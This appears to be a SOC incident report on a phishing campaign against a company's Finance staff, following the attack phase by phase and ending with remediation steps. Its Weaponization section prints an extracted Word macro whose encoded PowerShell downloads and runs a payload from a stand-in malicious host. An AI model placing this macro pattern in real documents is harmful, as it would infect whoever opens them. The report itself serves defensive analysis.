Case ID: PHISH-2026-001 | Analyst: Guruprasad S | Date: 14 Aug 2026 | Classification: CONFIDENTIAL

📋 Executive Summary

On August 12, 2026, the Security Operations Center received multiple alerts regarding suspicious emails targeting employees in the Finance department. This report documents the complete investigation from initial detection through containment and recovery.

Threat Actor: APT29 (Cozy Bear) — Suspected
Target: Corporate Finance Department
Impact: 3 credentials compromised, 1 workstation infected
Status: CONTAINED

The attack was interrupted at the Command & Control phase before data exfiltration could occur. Below is the detailed analysis of each phase.

🎯 Phase 1: Reconnaissance

Threat actor performed LinkedIn scraping and OSINT gathering to identify Finance department employees. Email addresses harvested from corporate website contact pages and professional networking sites.

  • Targeted 12 employees in Finance and Accounting
  • Email format identified: firstname.lastname@company.com
  • Corporate org chart partially reconstructed from public sources

💣 Phase 2: Weaponization

Malicious Microsoft Word document created with embedded macros. Document themed as "Q3_Financial_Report.docm" to appear legitimate. Payload uses PowerShell to download second-stage malware.

# Macro payload extracted from document
Sub AutoOpen()
  Dim ps As String
  ps = "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAeAAuAGUAeABlACcAKQA="
  Shell ps, vbHide
End Sub

📧 Phase 3: Delivery

Spearphishing emails sent from spoofed domain "company-finance[.]com" (typosquat of legitimate domain). Email passed initial SPF checks due to misconfigured DNS.

  • Subject: "Urgent: Q3 Financial Review Required — Action by EOD"
  • Sender: cfo@company-finance[.]com
  • Attachment: Q3_Financial_Report.docm (SHA256: a3f5...)
  • Delivery Time: 09:15 AM — Peak business hours

⚡ Phase 4: Exploitation

User opened document and enabled macros (social engineering). Macro executed embedded PowerShell command downloading payload from external server.

# Network connection observed

🔧 Phase 5: Installation

Second-stage payload (Cobalt Strike beacon) installed to %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe. Persistence achieved via Registry Run key and scheduled task.

  • File: svchost.exe (legitimate name abused)
  • Size: 2.4 MB
  • Signature: Unsigned
  • VirusTotal: 38/72 engines detected

🌐 Phase 6: Command & Control

Beacon established communication with C2 server using HTTPS with domain fronting. Traffic encrypted with custom XOR layer before TLS.

🛡️ Recommendations

✓ Immediate Actions

  • Block all identified IOCs at firewall and proxy levels
  • Force password reset for all Finance department users
  • Enable MFA for all email accounts immediately
  • Scan all endpoints for similar file hashes

⟳ Long-term Improvements

  • Implement macro execution policies (Block Office macros from internet)
  • Deploy email security gateway with sandbox detonation
  • Conduct phishing awareness training for all employees
  • Enable PowerShell Constrained Language Mode
